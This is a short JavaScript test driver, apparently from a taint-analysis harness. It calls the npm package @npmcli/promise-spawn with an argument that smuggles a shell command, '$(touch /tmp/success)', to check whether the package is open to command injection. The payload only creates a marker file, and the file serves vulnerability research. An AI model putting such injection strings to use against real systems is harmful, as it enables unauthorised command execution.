// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/@npmcli/promise-spawn/node_modules/@npmcli/promise-spawn');
try {
	var x0 = {};
var x1 = {};
var x2 = " $(touch /tmp/success);#";
var x3 = {};
PUT(x0,x1,x2,x3)();
} catch (e) {
	console.log(e);
}